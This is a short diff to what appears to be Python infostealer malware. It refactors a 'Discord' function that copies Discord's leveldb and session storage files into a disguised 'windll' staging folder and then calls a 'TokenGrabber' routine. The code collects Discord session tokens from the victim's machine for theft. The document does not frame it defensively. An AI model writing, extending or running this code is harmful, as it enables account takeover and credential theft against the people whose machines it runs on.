@@ -61,8 +61,9 @@ def TokenGrabber(local, roaming):
 
 
 
-def Discord(data):
-    data.append("\n\n\n**📬Messagers📬**")
+def Discord():
+    msgInfo = ""
+    msgInfo+="\n\n\n**📬Messagers📬**"
     dirs = [
         r'Local Storage\leveldb',
         r'Session Storage'
@@ -86,9 +87,9 @@ def Discord(data):
                 copy2(fr"{roaming}\discord\{file}",fr"{local}\windll\Messengers\Discord")
             except Exception as e:
                 Log(f"{file} DS files ---> {e}")
-        data.append("\n∟📨Discord")
+        msgInfo+="\n∟📨Discord"
         TokenGrabber(local, roaming)
-        return data
+        return msgInfo
     except Exception as e :
         Log(f"DS global ---> {e}")
-        return data
+        return msgInfo
